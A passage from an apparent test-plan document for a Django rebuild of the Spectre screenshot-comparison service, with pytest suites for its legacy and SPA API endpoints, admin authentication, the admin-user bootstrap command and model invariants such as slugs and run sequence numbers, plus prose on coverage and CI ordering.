        a = test_factory(passed=False)
        b = test_factory(passed=False)

        api.patch(f'/tests/{a.id}',                    {'test[baseline]': 'true'})
        api.post(f'/api/tests/{b.id}/set-baseline/',   {}, format='json')

        a.refresh_from_db(); b.refresh_from_db()
        assert a.passed is True
        assert b.passed is True


# =============================================================================
# GET /baselines/:key.png and .json
# =============================================================================

class TestBaselineLookup:
    def test_png_returns_image_bytes(self, api, test_factory, upload, testcard):
        from core.services.screenshot_comparison import ScreenshotComparison
        test = test_factory()
        ScreenshotComparison(test, upload(testcard)).run()

        response = api.get(f'/baselines/{test.key}.png')
        assert response.status_code == 200
        assert response['Content-Type'].startswith('image/')
        assert len(response.content) > 0

    def test_json_returns_metadata(self, api, test_factory, upload, testcard):
        from core.services.screenshot_comparison import ScreenshotComparison
        test = test_factory()
        ScreenshotComparison(test, upload(testcard)).run()

        response = api.get(f'/baselines/{test.key}.json')
        assert response.status_code == 200
        body = response.json()
        assert body['key'] == test.key
        assert body['screenshot_url']

    def test_unknown_key_returns_404(self, api):
        assert api.get('/baselines/no-such-key.png').status_code  == 404
        assert api.get('/baselines/no-such-key.json').status_code == 404


# =============================================================================
# Run-purge cascade — POST /runs triggers the post-save signal
# =============================================================================

class TestRunPurge:
    def test_sixth_run_drops_oldest(self, api, settings):
        settings.RUN_RETENTION_PER_SUITE = 5

        for _ in range(6):
            api.post('/runs', {'project': 'P', 'suite': 'S'})

        runs = list(Run.objects.filter(suite__name='S').order_by('sequential_id'))
        assert len(runs) == 5
        # Oldest seq_id (1) is gone; the kept ones are 2..6.
        assert [r.sequential_id for r in runs] == [2, 3, 4, 5, 6]

    def test_purge_cascade_deletes_tests(self, api, run_factory, testcard, settings):
        """Tests on a purged Run are gone too — Run → on_delete=CASCADE."""
        settings.RUN_RETENTION_PER_SUITE = 1

        suite_name = 'PurgeTarget'
        api.post('/runs', {'project': 'P', 'suite': suite_name})

        # Get the run we just created and post a test against it.
        run = Run.objects.filter(suite__name=suite_name).first()
        with testcard.open('rb') as fh:
            api.post('/tests', {
                'test[run_id]':     str(run.id),
                'test[name]':       'X', 'test[browser]': 'C', 'test[size]': '1024',
                'test[screenshot]': fh,
            }, format='multipart')

        assert Test.objects.filter(run=run).exists()

        # Posting a fresh run purges the old one and cascades to its tests.
        api.post('/runs', {'project': 'P', 'suite': suite_name})

        assert not Run.objects.filter(pk=run.pk).exists()
        assert not Test.objects.filter(run=run).exists()


# =============================================================================
# Concurrency — sequential_id under select_for_update
# =============================================================================

@pytest.mark.skipif(
    'sqlite' in str(pytest.importorskip('django').conf.settings.DATABASES['default']['ENGINE']),
    reason="select_for_update is a no-op on SQLite — would pass for the wrong reason",
)
class TestConcurrentRunCreation:
    def test_no_collision_under_threads(self, api):
        """Two POST /runs against the same suite → sequential_ids 1 and 2, never 1 and 1.

        Regression test for the race documented in data-model.md.
        """
        import threading

        # Pre-create the suite so both threads contend on next_run_seq, not on get_or_create.
        api.post('/runs', {'project': 'P', 'suite': 'S'})

        results = []

        def worker():
            response = APIClient().post('/runs', {'project': 'P', 'suite': 'S'})
            results.append(response.json()['sequential_id'])

        threads = [threading.Thread(target=worker) for _ in range(5)]
        for t in threads: t.start()
        for t in threads: t.join()

        # 1 from the seed call + 5 from the threads, all distinct, contiguous.
        all_ids = sorted([1] + results)
        assert all_ids == [1, 2, 3, 4, 5, 6]
```

### What this pack does and doesn't cover

Covers:
- Every legacy endpoint at the HTTP layer: form-encoded `POST /runs`, multipart `POST /tests`, form-encoded `PATCH /tests/:id`, `GET /baselines/:key.png`/`.json`.
- The `is_new_baseline` rebuild-additive field on the response, which the comparison test pack also covers but reaching it through the view pins the *response* shape rather than the *return value* of `ScreenshotComparison.run()`.
- The same shell-injection vectors as the comparison test pack, but at the view boundary — which is where the validator is supposed to run. If a future refactor moves validation deeper into the stack, this layer's tests still hold.
- The legacy-vs-SPA equivalence check: PATCH and POST `/api/tests/<id>/set-baseline/` produce the same observable end state.
- The full run-purge cascade: posting the (N+1)-th run triggers the signal, the signal cascades to Test, the cascade also wipes any FileField references.
- The concurrency regression for `select_for_update`, gated behind a SQLite skip so it can't pass for the wrong reason.

Does not cover (leave for elsewhere):
- The SPA-only endpoints (`/api/projects/`, `/api/projects/<slug>/suites/<slug>/`, etc.) — those go in `test_spa_api.py`.
- Image diff correctness — that's `test_screenshot_comparison.py`.
- Wire-format field set drift — that's `test_serializers.py`.
- Admin URL behaviour, login, CSRF — `test_admin.py`.

### How this maps to the existing test packs

- `test_screenshot_comparison.py` proves the diff service does the right thing in isolation.
- `test_serializers.py` proves the wire format hasn't drifted from the client contract.
- `test_legacy_api.py` (this file) proves the HTTP layer wires those two correctly.

Catching a gem-breaking regression takes a failure in at least one of the three. The expensive `test_screenshot_comparison.py` is the slow one; this file is moderate (multipart + DB but no extra ImageMagick beyond what the comparison service itself runs); `test_serializers.py` is sub-second. Order them in CI in that increasing-cost order so cheap regressions surface first.

### One thing this pack deliberately overlaps with

`test_returns_full_legacy_field_set` re-asserts what `test_serializers.py`'s `test_legacy_serializer_field_set_is_frozen` already pins, but at the view layer rather than the serializer layer. This is intentional duplication: a refactor that introduces a custom view-layer renderer (e.g. someone adds a `Vary: Accept` shim that strips fields per content-type) could drift the wire format without the serializer test catching it. The view-level field-set check is the belt to the serializer's suspenders.

## `test_spa_api.py` — SPA-internal endpoints

Mirror of `test_legacy_api.py` for the `/api/` surface. Different ground rules: JSON in, JSON out, no multipart, no form-encoding. The contract here is internal — the SPA ships from this repo, so a contract change is a single PR that touches both sides.

### `core/tests/test_spa_api.py`

```python
import pytest
from rest_framework.test import APIClient

from core.models import Test


pytestmark = pytest.mark.django_db


@pytest.fixture
def api():
    return APIClient()


# =============================================================================
# GET /api/projects/  — projects list (top of the SPA)
# =============================================================================

class TestProjectsList:
    def test_returns_alphabetically_sorted_projects(self, api, project_factory):
        project_factory(name='Zeta')
        project_factory(name='Alpha')
        project_factory(name='Mu')

        response = api.get('/api/projects/')
        assert response.status_code == 200
        names = [p['name'] for p in response.json()]
        assert names == ['Alpha', 'Mu', 'Zeta']

    def test_each_project_includes_its_suites(self, api, project_factory, suite_factory):
        project = project_factory(name='Acme')
        suite_factory(project=project, name='Desktop')
        suite_factory(project=project, name='Mobile')

        body = api.get('/api/projects/').json()
        suites = {s['name'] for s in body[0]['suites']}
        assert suites == {'Desktop', 'Mobile'}

    def test_suite_payload_includes_latest_run_summary(
        self, api, project_factory, suite_factory, run_factory,
    ):
        project = project_factory(name='Acme')
        suite   = suite_factory(project=project, name='Desktop')
        run_factory(suite=suite)
        run_factory(suite=suite)   # latest

        body = api.get('/api/projects/').json()
        suite_payload = body[0]['suites'][0]
        assert suite_payload['latest_run']['sequential_id'] == 2

    def test_suite_with_no_runs_has_null_latest_run(self, api, project_factory, suite_factory):
        """The legacy template crashed on `suite.latest_run` when it was nil.
        The SPA gets a clean `null` instead, so it can render an empty-state pill.
        """
        project = project_factory(name='Acme')
        suite_factory(project=project, name='Empty')

        body = api.get('/api/projects/').json()
        assert body[0]['suites'][0]['latest_run'] is None

    def test_empty_state_returns_empty_array(self, api):
        assert api.get('/api/projects/').json() == []


# =============================================================================
# GET /api/projects/<slug>/suites/<slug>/  — suite detail
# =============================================================================

class TestSuiteDetail:
    def test_returns_latest_5_runs_and_baselines(
        self, api, project_factory, suite_factory, run_factory,
    ):
        project = project_factory(name='Acme')
        suite   = suite_factory(project=project, name='Desktop')
        for _ in range(8):
            run_factory(suite=suite)
        # purge_old_runs keeps 5; the SPA never sees more.

        response = api.get('/api/projects/acme/suites/desktop/')
        assert response.status_code == 200
        body = response.json()
        assert len(body['latest_runs']) == 5
        assert body['baselines']        == []

    def test_uses_current_slug_after_rename(
        self, api, project_factory, suite_factory, run_factory,
    ):
        """decisions.md #4: rename re-slugs the project, and the URL the SPA uses follows."""
        project = project_factory(name='Acme')
        suite   = suite_factory(project=project, name='Desktop')
        run_factory(suite=suite)

        # SPA fetches via the original slug.
        assert api.get('/api/projects/acme/suites/desktop/').status_code == 200

        # Operator renames the project in /admin/.
        project.name = 'Acme Inc'
        project.save()

        # Old slug 404s (intentional break — decisions.md #4).
        assert api.get('/api/projects/acme/suites/desktop/').status_code == 404
        # New slug works.
        assert api.get('/api/projects/acme-inc/suites/desktop/').status_code == 200

    def test_unknown_project_or_suite_returns_404(self, api, project_factory, suite_factory):
        project = project_factory(name='Acme')
        suite_factory(project=project, name='Desktop')

        assert api.get('/api/projects/no-such-project/suites/desktop/').status_code == 404
        assert api.get('/api/projects/acme/suites/no-such-suite/').status_code     == 404


# =============================================================================
# GET /api/projects/<slug>/suites/<slug>/runs/<seq>/  — run detail
# =============================================================================

class TestRunDetail:
    def test_returns_run_with_inline_tests(
        self, api, project_factory, suite_factory, run_factory, test_factory,
    ):
        project = project_factory(name='Acme')
        suite   = suite_factory(project=project, name='Desktop')
        run     = run_factory(suite=suite)
        test_factory(run=run, name='Homepage')
        test_factory(run=run, name='About')

        response = api.get('/api/projects/acme/suites/desktop/runs/1/')
        assert response.status_code == 200
        body = response.json()
        assert body['sequential_id'] == 1
        assert {t['name'] for t in body['tests']} == {'Homepage', 'About'}

    def test_test_row_uses_passed_not_pass(
        self, api, project_factory, suite_factory, run_factory, test_factory,
    ):
        """The SPA's wire format uses `passed` — opposite of the gem's `pass`.

        api.md, "Serializers": SPA serializers expose the model field name.
        """
        project = project_factory(name='Acme')
        suite   = suite_factory(project=project, name='Desktop')
        run     = run_factory(suite=suite)
        test_factory(run=run, passed=True)

        body = api.get('/api/projects/acme/suites/desktop/runs/1/').json()
        test = body['tests'][0]

        assert 'passed' in test
        assert test['passed'] is True
        assert 'pass' not in test, "leaked the legacy wire format into the SPA payload"

    def test_unknown_seq_id_returns_404(
        self, api, project_factory, suite_factory, run_factory,
    ):
        project = project_factory(name='Acme')
        suite   = suite_factory(project=project, name='Desktop')
        run_factory(suite=suite)   # sequential_id == 1

        assert api.get('/api/projects/acme/suites/desktop/runs/999/').status_code == 404


# =============================================================================
# POST /api/tests/<id>/set-baseline/  — SPA-preferred shape
# =============================================================================

class TestSetBaselineSpa:
    def test_promotes_test_to_baseline(self, api, test_factory):
        test = test_factory(passed=False)
        response = api.post(f'/api/tests/{test.id}/set-baseline/', {}, format='json')

        assert response.status_code == 204
        assert response.content     == b''   # empty body — idiomatic for 204
        test.refresh_from_db()
        assert test.passed is True

    def test_accepts_empty_json_body(self, api, test_factory):
        """The SPA sends `{}` — empty body, JSON content-type."""
        test = test_factory(passed=False)
        response = api.post(
            f'/api/tests/{test.id}/set-baseline/',
            data={}, format='json',
        )
        assert response.status_code == 204

    def test_body_content_is_ignored(self, api, test_factory):
        """A malicious client sending `{"pass": false}` cannot un-promote a test.

        api.md, "View skeletons": the endpoint always promotes; body is ignored.
        """
        test = test_factory(passed=False)
        api.post(
            f'/api/tests/{test.id}/set-baseline/',
            data={'pass': False, 'passed': False, 'baseline': False},
            format='json',
        )
        test.refresh_from_db()
        assert test.passed is True   # promoted regardless

    def test_unknown_id_returns_404(self, api):
        assert api.post('/api/tests/999999/set-baseline/', {}, format='json').status_code == 404

    def test_idempotent_on_already_passed_test(self, api, test_factory):
        """Calling set-baseline on an already-passed test is a no-op (still 204)."""
        test = test_factory(passed=True)
        first  = api.post(f'/api/tests/{test.id}/set-baseline/', {}, format='json')
        second = api.post(f'/api/tests/{test.id}/set-baseline/', {}, format='json')

        assert first.status_code  == 204
        assert second.status_code == 204
        test.refresh_from_db()
        assert test.passed is True


# =============================================================================
# GET /api/baselines/<key>/  — JSON metadata (no .json suffix; SPA-only)
# =============================================================================

class TestBaselineDetailSpa:
    def test_returns_baseline_metadata(self, api, test_factory, upload, testcard):
        from core.services.screenshot_comparison import ScreenshotComparison
        test = test_factory()
        ScreenshotComparison(test, upload(testcard)).run()

        response = api.get(f'/api/baselines/{test.key}/')
        assert response.status_code == 200
        body = response.json()
        assert body['key']            == test.key
        assert body['screenshot_url']
        assert body['thumbnail_url']

    def test_unknown_key_returns_404(self, api):
        assert api.get('/api/baselines/no-such-key/').status_code == 404


# =============================================================================
# CORS  — the SPA in split-host topology must be able to reach the API
# =============================================================================

class TestCors:
    """Only meaningful when CORS_ALLOWED_ORIGINS is set — split-host topology.

    In the same-origin topology (the recommended one — deployment-and-config.md),
    these tests still pass because django-cors-headers is a no-op when the
    setting is empty.
    """

    def test_cors_header_set_for_allowed_origin(self, api, settings):
        settings.CORS_ALLOWED_ORIGINS = ['https://spectre.example.com']
        response = api.get(
            '/api/projects/',
            HTTP_ORIGIN='https://spectre.example.com',
        )
        assert response.headers.get('Access-Control-Allow-Origin') == 'https://spectre.example.com'

    def test_cors_header_absent_for_disallowed_origin(self, api, settings):
        settings.CORS_ALLOWED_ORIGINS = ['https://spectre.example.com']
        response = api.get(
            '/api/projects/',
            HTTP_ORIGIN='https://evil.example.com',
        )
        assert 'Access-Control-Allow-Origin' not in response.headers
```

### What this pack covers

- Every SPA endpoint listed in `api.md`'s "View skeletons → core/views/api.py" section.
- The `/api/` surface's wire format (the `passed` key, not `pass`) and the deliberate guard against a SPA payload accidentally inheriting the legacy `pass` key.
- The auto-update-slug consequence at the URL level: an old project slug 404s after rename, the new slug resolves. This is the test that proves the "old links break" copy in `decisions.md` #4.
- The "set as baseline" semantics on the SPA endpoint: 204 No Content, body ignored (so a hostile client can't un-promote), idempotent, and shares the underlying `_set_as_baseline` seam with the legacy `PATCH /tests/:id`.
- CORS — gated behind a `settings.CORS_ALLOWED_ORIGINS` override, runs in either topology, only meaningful in split-host.

### What it doesn't cover

- The diff pipeline itself (covered in `test_screenshot_comparison.py`).
- The `is_new_baseline` field — that's a `POST /tests` (legacy) concern, not a SPA-endpoint concern.
- Pagination, filtering, search — none of those exist in the SPA API yet ([decisions.md](decisions.md), "Functional gaps left for later").
- Auth — the SPA endpoints are anonymous by decision; no test for "anonymous request is rejected" because none should be.

### How this maps to the SPA itself

Each test class corresponds 1:1 with a feature folder in `frontend/src/app/features/` and an `HttpClient` call in `core/api/spectre-api.service.ts`. If a frontend developer needs to know "what shape does `/api/projects/<p>/suites/<s>/runs/<n>/` actually return", `TestRunDetail.test_returns_run_with_inline_tests` is the executable answer. The TypeScript `Run` interface and these assertions are the same contract written twice — once in each language. A future improvement is to derive the SPA types from DRF via `drf-spectacular`, eliminating that duplication ([api.md](api.md), "Formal contract (deferred)").

### Speed

Pure DB + DRF. Whole file runs in ~1–2 seconds. The two tests that touch `ScreenshotComparison` (under `TestBaselineDetailSpa`) add a few `convert`/`compare` invocations — still cheap, but if speed becomes an issue, swap them for direct `Baseline.objects.create(...)` with a `screenshot=SimpleUploadedFile(b'fake-png-bytes')` payload. The endpoint doesn't care whether the bytes are a real PNG, only that the field is populated.

## `test_admin.py` — admin auth, rename warning, and `ensure_admin_user`

The admin layer is small but security-critical. It's the only authenticated surface in the app ([decisions.md](decisions.md) #6) and the only place the rename-severs-baselines warning ([decisions.md](decisions.md) #4) is surfaced to the operator. Three things to test: the auth gate, the rename-warning template, and the management command's reconcile semantics.

### `core/tests/test_admin.py`

```python
import pytest
from django.contrib.auth import get_user_model
from django.core.management import call_command
from django.urls import reverse
from rest_framework.test import APIClient


pytestmark = pytest.mark.django_db


User = get_user_model()


# =============================================================================
# Auth gate — /admin/ requires login, /api/ and / do not
# =============================================================================

class TestAdminAuth:
    def test_admin_index_redirects_anonymous_to_login(self, client):
        response = client.get('/admin/')
        # Django's stock behaviour: 302 to /admin/login/?next=/admin/
        assert response.status_code == 302
        assert '/admin/login/' in response.headers['Location']

    def test_admin_index_loads_for_staff_user(self, client):
        User.objects.create_user(
            username='admin', password='supersecret',
            is_staff=True, is_superuser=True,
        )
        client.login(username='admin', password='supersecret')

        response = client.get('/admin/')
        assert response.status_code == 200
        assert b'Site administration' in response.content

    def test_non_staff_user_cannot_access_admin(self, client):
        User.objects.create_user(username='regular', password='regular', is_staff=False)
        client.login(username='regular', password='regular')

        response = client.get('/admin/')
        # Stock behaviour: redirect back to login (not 403) — Django treats
        # is_staff=False as if the user weren't logged in for /admin/.
        assert response.status_code == 302
        assert '/admin/login/' in response.headers['Location']

    def test_api_endpoints_are_anonymous(self):
        """The auth gate must NOT extend to /api/ or the legacy paths.

        decisions.md, "Auth (public / API)": no auth.
        """
        anon = APIClient()
        # Empty 200 (no projects), not 401 or 302.
        assert anon.get('/api/projects/').status_code == 200

    def test_legacy_endpoints_are_anonymous(self):
        """Same invariant for the legacy API surface."""
        anon = APIClient()
        response = anon.post('/runs', {'project': 'P', 'suite': 'S'})
        assert response.status_code == 200


# =============================================================================
# CRUD reachability — every model has its admin pages and they don't crash
# =============================================================================

class TestAdminCrud:
    """Smoke tests: every ModelAdmin's listing and add page renders for a logged-in admin.

    These are the cheapest possible defence against a `list_display` typo or
    a missing related field that would 500 in production the first time someone
    opens `/admin/core/test/`.
    """

    @pytest.fixture
    def admin_client(self, client):
        User.objects.create_user(
            username='admin', password='secret', is_staff=True, is_superuser=True,
        )
        client.login(username='admin', password='secret')
        return client

    @pytest.mark.parametrize("model_path", [
        'core/project', 'core/suite', 'core/run', 'core/test', 'core/baseline',
    ])
    def test_changelist_loads(self, admin_client, model_path):
        response = admin_client.get(f'/admin/{model_path}/')
        assert response.status_code == 200

    @pytest.mark.parametrize("model_path", [
        'core/project', 'core/suite',
        # Run/Test/Baseline aren't realistically created from the admin form
        # (they need related objects + computed fields). Smoke-testing the
        # add page would mostly assert that the form renders, not that it
        # works end-to-end.
    ])
    def test_add_page_loads(self, admin_client, model_path):
        response = admin_client.get(f'/admin/{model_path}/add/')
        assert response.status_code == 200

    def test_test_admin_changelist_shows_diff_pct_column(
        self, admin_client, test_factory,
    ):
        """The custom `diff_pct` method on TestAdmin renders without crashing."""
        test_factory(diff=12.34)
        response = admin_client.get('/admin/core/test/')
        assert response.status_code == 200
        assert b'12.34%' in response.content


# =============================================================================
# Rename-warning template — Project and Suite show the banner on edit
# =============================================================================

class TestRenameWarning:
    """The banner from RenameWarningMixin must:
       - appear on the change form (edit) for Project and Suite
       - NOT appear on the add form (no existing baselines to sever yet)
       - NOT appear on Run/Test/Baseline change forms (no rename concept)
    """

    @pytest.fixture
    def admin_client(self, client):
        User.objects.create_user(
            username='admin', password='secret', is_staff=True, is_superuser=True,
        )
        client.login(username='admin', password='secret')
        return client

    BANNER_PHRASE = b'Renaming severs baselines'

    def test_banner_visible_on_project_edit(self, admin_client, project_factory):
        project = project_factory()
        response = admin_client.get(f'/admin/core/project/{project.pk}/change/')
        assert response.status_code == 200
        assert self.BANNER_PHRASE in response.content

    def test_banner_visible_on_suite_edit(self, admin_client, suite_factory):
        suite = suite_factory()
        response = admin_client.get(f'/admin/core/suite/{suite.pk}/change/')
        assert response.status_code == 200
        assert self.BANNER_PHRASE in response.content

    def test_banner_absent_on_project_add(self, admin_client):
        response = admin_client.get('/admin/core/project/add/')
        assert response.status_code == 200
        assert self.BANNER_PHRASE not in response.content

    def test_banner_absent_on_suite_add(self, admin_client):
        response = admin_client.get('/admin/core/suite/add/')
        assert response.status_code == 200
        assert self.BANNER_PHRASE not in response.content

    @pytest.mark.parametrize("admin_path", [
        'core/run', 'core/test', 'core/baseline',
    ])
    def test_banner_absent_on_other_models(
        self, admin_client, admin_path, run_factory, test_factory, suite_factory,
    ):
        """Run/Test/Baseline don't inherit the mixin — the banner shouldn't appear there."""
        # Spin up an instance of the right type so the changelist has a row to link to.
        if admin_path == 'core/run':
            obj = run_factory()
        elif admin_path == 'core/test':
            obj = test_factory()
        else:
            from core.models import Baseline
            suite = suite_factory()
            obj = Baseline.objects.create(
                suite=suite, name='X', browser='Chrome', size='1024', key='x',
            )

        response = admin_client.get(f'/admin/{admin_path}/{obj.pk}/change/')
        assert response.status_code == 200
        assert self.BANNER_PHRASE not in response.content


# =============================================================================
# ensure_admin_user — reconcile semantics
# =============================================================================

class TestEnsureAdminUser:
    """The management command is the bootstrap path for the single shared admin
    (admin.md, "Authentication setup"). It runs on every container start, so
    its idempotency guarantees matter: rotation, recreation, and no-op cases
    must all work without operator intervention.
    """

    def test_creates_admin_when_missing(self, settings, capsys):
        settings.ADMIN_USERNAME = 'admin'
        settings.ADMIN_PASSWORD = 'first-secret'

        call_command('ensure_admin_user')

        user = User.objects.get(username='admin')
        assert user.is_staff is True
        assert user.is_superuser is True
        assert user.check_password('first-secret')

    def test_updates_password_when_changed(self, settings):
        settings.ADMIN_USERNAME = 'admin'
        settings.ADMIN_PASSWORD = 'first-secret'
        call_command('ensure_admin_user')

        # Operator rotates the password via env + redeploy.
        settings.ADMIN_PASSWORD = 'second-secret'
        call_command('ensure_admin_user')

        user = User.objects.get(username='admin')
        assert user.check_password('second-secret')
        assert not user.check_password('first-secret')

    def test_does_not_rehash_when_password_unchanged(self, settings):
        """check_password short-circuits; set_password is NOT called on a no-op run.

        We assert this by capturing the hash before and after — Django's hashers
        produce a fresh salt every call, so a re-hash would change the stored value.
        """
        settings.ADMIN_USERNAME = 'admin'
        settings.ADMIN_PASSWORD = 'unchanged'
        call_command('ensure_admin_user')

        hash_before = User.objects.get(username='admin').password
        call_command('ensure_admin_user')
        hash_after  = User.objects.get(username='admin').password

        assert hash_before == hash_after, "rehashed on a no-op run — fix check_password gate"

    def test_reconciles_is_staff_after_manual_clear(self, settings):
        """If an operator clears is_staff in /admin/, the next deploy puts it back."""
        settings.ADMIN_USERNAME = 'admin'
        settings.ADMIN_PASSWORD = 'secret'
        call_command('ensure_admin_user')

        user = User.objects.get(username='admin')
        user.is_staff = False
        user.is_superuser = False
        user.save()

        call_command('ensure_admin_user')

        user.refresh_from_db()
        assert user.is_staff is True
        assert user.is_superuser is True

    def test_no_op_when_password_unset(self, settings, capsys):
        """ADMIN_PASSWORD missing → command logs a warning and does not create the user.

        Loud no-op so the operator notices in production.
        """
        settings.ADMIN_USERNAME = 'admin'
        settings.ADMIN_PASSWORD = None

        call_command('ensure_admin_user')

        assert not User.objects.filter(username='admin').exists()
        captured = capsys.readouterr()
        assert 'ADMIN_PASSWORD' in captured.out

    def test_changing_username_creates_new_user(self, settings):
        """admin.md, judgment call: rename-by-side-effect is surprising. Changing
        ADMIN_USERNAME creates a second admin instead of renaming the first.
        Operator cleans up via shell if that's not what they meant.
        """
        settings.ADMIN_USERNAME = 'admin'
        settings.ADMIN_PASSWORD = 'secret'
        call_command('ensure_admin_user')

        settings.ADMIN_USERNAME = 'newadmin'
        call_command('ensure_admin_user')

        assert User.objects.filter(username='admin').exists()
        assert User.objects.filter(username='newadmin').exists()
        assert User.objects.filter(is_staff=True).count() == 2

    def test_idempotent_on_repeated_runs(self, settings):
        """Running the command 10 times in a row should produce exactly one admin user."""
        settings.ADMIN_USERNAME = 'admin'
        settings.ADMIN_PASSWORD = 'secret'
        for _ in range(10):
            call_command('ensure_admin_user')

        assert User.objects.filter(username='admin').count() == 1
```

### What this pack covers

- The auth gate at `/admin/` (302 for anonymous, 302 for non-staff, 200 for staff) and the *negative* assertion that the gate doesn't extend to `/api/` or the legacy paths.
- A parametrized smoke test that every ModelAdmin's changelist loads, plus add-page checks for the two models where adding from the admin makes sense (Project, Suite). Catches `list_display` typos and missing related accessors before they 500 in production.
- The custom `TestAdmin.diff_pct` rendering — proves the formatted-percent column doesn't crash on real data.
- The rename-warning template, with explicit positive *and* negative assertions: visible on Project/Suite edit pages, absent on add pages, absent on Run/Test/Baseline. The banner phrase `"Renaming severs baselines"` is the assertion key — same string as the template, so a wording change forces the test update with the diff visible.
- All seven `ensure_admin_user` invariants: create, update, no-rehash-on-noop, reconcile-after-clear, no-op-when-password-unset, rename-creates-new-user, idempotent-under-repetition.

### What it doesn't cover

- The login form itself — that's Django's stock view, testing it is "testing the framework".
- Brute-force protection / rate limiting — not implemented; if it ever is, that becomes its own pack.
- Action-level permissions inside the admin (which fields are editable, etc.) — implicit in the `readonly_fields` declaration on each ModelAdmin; the change-page tests above prove the page loads, which is enough.
- The `manage.py changepassword` interactive flow — operational, not behavioural.

### Why parametrize the changelist test

Five models × two scopes (changelist + add) is enough surface that a hand-rolled list-of-tests would be tedious. Parametrize over the URL fragment; pytest gives a clean `test_changelist_loads[core/test]` failure message naming the exact admin URL that broke. Same reasoning as the shell-injection parametrize block in `test_screenshot_comparison.py`: deterministic, named-by-input failures.

### Speed

Pure DB. The whole file runs in 1–2 seconds even with the parametrized changelist sweep. No subprocess shell-outs, no S3 calls, no real ImageMagick. Run it on every commit.

### One thing this pack deliberately doesn't test

The `RenameWarningMixin` is *only* asserted via the rendered HTML, not via direct unit testing of `render_change_form`. That's the right level: the contract the operator cares about is "does the banner appear" — not "does `context['show_rename_warning']` get set". Direct testing of the mixin's internals would couple the test to the implementation; HTML-level assertions survive any future refactor as long as the banner still appears.

## `test_models.py` — model invariants and signals

This pack pins the four model behaviours that aren't visible from the API surface: per-suite sequential IDs, the slug auto-update, the run-purge signal, and the `Test.key` formula. Each one is a place where the legacy app had a bug or a quiet footgun that the rebuild fixes.

### `core/tests/test_models.py`

```python
import threading

import pytest
from django.db import connection, transaction

from core.models import Baseline, Project, Run, Suite, Test


pytestmark = pytest.mark.django_db


# =============================================================================
# Slug auto-update on rename — Project + Suite
# =============================================================================

class TestSlugAutoUpdate:
    """decisions.md #4: rename re-slugs the model. Old links break, future
    Test keys reflect the new slug, existing baselines orphan.
    """

    def test_project_slug_set_from_name_on_create(self, project_factory):
        project = project_factory(name='Acme Site')
        assert project.slug == 'acme-site'

    def test_project_slug_updates_on_rename(self, project_factory):
        project = project_factory(name='Acme Site')
        project.name = 'Acme Inc'
        project.save()
        project.refresh_from_db()
        assert project.slug == 'acme-inc'

    def test_suite_slug_set_from_name_on_create(self, suite_factory):
        suite = suite_factory(name='Mobile Phones')
        assert suite.slug == 'mobile-phones'

    def test_suite_slug_updates_on_rename(self, suite_factory):
        suite = suite_factory(name='Mobile')
        suite.name = 'Tablet'
        suite.save()
        suite.refresh_from_db()
        assert suite.slug == 'tablet'

    def test_two_suites_in_different_projects_can_share_a_slug(
        self, project_factory, suite_factory,
    ):
        """Suite slug is unique PER PROJECT, not globally — fixes a quiet legacy bug."""
        a = project_factory(name='Project A')
        b = project_factory(name='Project B')
        suite_factory(project=a, name='Desktop')
        suite_factory(project=b, name='Desktop')
        # Both saved without IntegrityError → constraint is per-project as intended.
        assert Suite.objects.filter(slug='desktop').count() == 2

    def test_two_suites_in_same_project_cannot_share_a_slug(
        self, project_factory, suite_factory,
    ):
        """The unique_suite_slug_per_project constraint must reject duplicates."""
        from django.db import IntegrityError
        project = project_factory(name='Acme')
        suite_factory(project=project, name='Desktop')

        with pytest.raises(IntegrityError):
            with transaction.atomic():
                suite_factory(project=project, name='Desktop')


# =============================================================================
# Test.key formula — slug-from-(project, suite, name, browser, size)
# =============================================================================

class TestKeyFormula:
    """data-model.md, "Key formula": tests are linked to baselines by a
    slugified concatenation. The formula MUST stay byte-compatible with what
    the legacy gem expects, modulo Unicode handling.
    """

    def test_key_combines_all_five_inputs(
        self, project_factory, suite_factory, run_factory, test_factory,
    ):
        project = project_factory(name='Acme Site')
        suite   = suite_factory(project=project, name='Desktop')
        run     = run_factory(suite=suite)
        test    = test_factory(run=run, name='Homepage', browser='Chrome', size='1024')

        assert test.key == 'acme-site-desktop-homepage-chrome-1024'

    def test_key_recomputes_when_test_is_re_saved(
        self, project_factory, suite_factory, run_factory, test_factory,
    ):
        """Renaming a project doesn't backfill old Test keys, but a Test re-save does.

        decisions.md #4: future Tests get new keys; existing rows can be touched
        in admin to refresh.
        """
        project = project_factory(name='Acme')
        suite   = suite_factory(project=project, name='Desktop')
        run     = run_factory(suite=suite)
        test    = test_factory(run=run, name='Homepage', browser='Chrome', size='1024')
        original_key = test.key

        project.name = 'Acme Inc'
        project.save()

        # Just calling save() rebuilds key from the current slugs.
        test.save()
        test.refresh_from_db()
        assert test.key != original_key
        assert test.key.startswith('acme-inc-')

    @pytest.mark.parametrize("inputs,expected", [
        # (project, suite, name, browser, size) → key
        (("Acme",      "Desktop", "Homepage",  "Chrome", "1024"),  "acme-desktop-homepage-chrome-1024"),
        (("Acme  X",   "Desk",    "Home page", "Chrome", "1024"),  "acme-x-desk-home-page-chrome-1024"),
        (("Café",      "Desk",    "Login",     "Chrome", "1024"),  "cafe-desk-login-chrome-1024"),
        (("Acme!",     "Desk",    "Page/X",    "Chrome", "1024"),  "acme-desk-page-x-chrome-1024"),
    ])
    def test_key_handles_punctuation_and_whitespace(
        self, inputs, expected,
        project_factory, suite_factory, run_factory, test_factory,
    ):
        """slugify() collapses whitespace, lowercases, drops punctuation, ASCII-folds."""
        proj_name, suite_name, name, browser, size = inputs
        project = project_factory(name=proj_name)
        suite   = suite_factory(project=project, name=suite_name)
        run     = run_factory(suite=suite)
        test    = test_factory(run=run, name=name, browser=browser, size=size)
        assert test.key == expected


# =============================================================================
# Run sequential_id — per-suite, monotonic, no resequence on delete
# =============================================================================

class TestRunSequentialId:
    def test_first_run_in_suite_starts_at_1(self, suite_factory, run_factory):
        suite = suite_factory()
        run = run_factory(suite=suite)
        assert run.sequential_id == 1

    def test_sequential_ids_increment_per_suite(self, suite_factory, run_factory):
        suite = suite_factory()
        seqs = [run_factory(suite=suite).sequential_id for _ in range(5)]
        assert seqs == [1, 2, 3, 4, 5]

    def test_different_suites_have_independent_counters(self, suite_factory, run_factory):
        a = suite_factory()
        b = suite_factory()
        run_factory(suite=a)
        run_factory(suite=a)
        first_b = run_factory(suite=b)
        assert first_b.sequential_id == 1

    def test_counter_does_not_resequence_after_delete(self, suite_factory, run_factory):
        """Legacy parity: sequenced gem is monotonic. Deleting run #1 leaves the
        next-run counter at 3, not 2 — the SPA's URL bar can show #1 missing.
        """
        suite = suite_factory()
        first  = run_factory(suite=suite)
